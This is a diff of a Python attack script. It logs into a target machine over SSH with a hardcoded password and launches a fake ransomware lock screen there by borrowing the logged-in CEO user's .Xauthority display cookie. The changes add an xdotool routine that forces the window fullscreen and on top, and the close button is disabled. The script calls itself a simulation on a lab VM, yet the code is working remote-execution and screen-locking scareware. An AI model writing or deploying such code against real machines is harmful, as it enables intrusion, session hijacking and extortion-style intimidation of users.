@@ -10,9 +10,24 @@ PASSWORD = "CEOPass123!"
 def main():
     print(f"[*] Preparing to deploy payload to hardened target {TARGET_IP}...")
 
+    # The Tkinter Payload with xdotool bypass
     payload_script = """#!/usr/bin/env python3
 import tkinter as tk
 import time
+import subprocess
+import threading
+
+def force_fullscreen():
+    # Wait a brief moment for the window manager to draw the window
+    time.sleep(0.5)
+    
+    # Use xdotool to find the window by name, move it to 0,0, resize it, and keep it on top
+    try:
+        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowmove", "0", "0"], check=False)
+        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowsize", "100%", "100%"], check=False)
+        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowraise"], check=False)
+    except Exception:
+        pass
 
 def pay_ransom():
     lbl.config(text="Decrypting...")
@@ -24,20 +39,29 @@ def pay_ransom():
     root.destroy()
 
 root = tk.Tk()
-root.attributes('-fullscreen', True)
-root.attributes('-topmost', True) 
+root.title("System Locked") # We give it a title so xdotool can find it
 root.configure(background='black')
-root.overrideredirect(True) 
+root.overrideredirect(True)
+
+# Force basic fullscreen
+screen_width = root.winfo_screenwidth()
+screen_height = root.winfo_screenheight()
+root.geometry(f"{screen_width}x{screen_height}+0+0")
+root.attributes('-topmost', True) 
 
 lbl = tk.Label(root, text="Your Kali files have been simulated-encrypted!\\nClick below to end.", 
                fg="lime", bg="black", font=("Courier", 30, "bold"))
-lbl.pack(expand=True)
+lbl.pack(expand=True, fill='both')
 
 btn = tk.Button(root, text="Pay Ransom", command=pay_ransom, 
                 bg="darkred", fg="white", font=("Courier", 20, "bold"))
 btn.pack(side="bottom", pady=50)
 
 root.protocol("WM_DELETE_WINDOW", lambda: None)
+
+# Start the xdotool bypass in the background
+threading.Thread(target=force_fullscreen, daemon=True).start()
+
 root.mainloop()
 """
 
@@ -56,8 +80,7 @@ root.mainloop()
 
         print("[*] Triggering GUI using active Xauthority...")
         
-        # We explicitly point to the CEO user's Xauthority file.
-        # Because CEO is logged in, this file contains the valid cookie for the display.
+        # Explicitly point to the CEO user's Xauthority file and launch
         exec_cmd = (
             f"export DISPLAY=:0; "
             f"export XAUTHORITY=/home/{USERNAME}/.Xauthority; "
@@ -67,7 +90,6 @@ root.mainloop()
         ssh.exec_command(exec_cmd)
         
         print("[+] Attack simulation launched. Check the Hardened Kali VM screen!")
-        print("[*] (If it fails, run: ssh CEO@172.16.1.100 'cat /tmp/gui_out.log')")
         ssh.close()
 
     except paramiko.AuthenticationException:
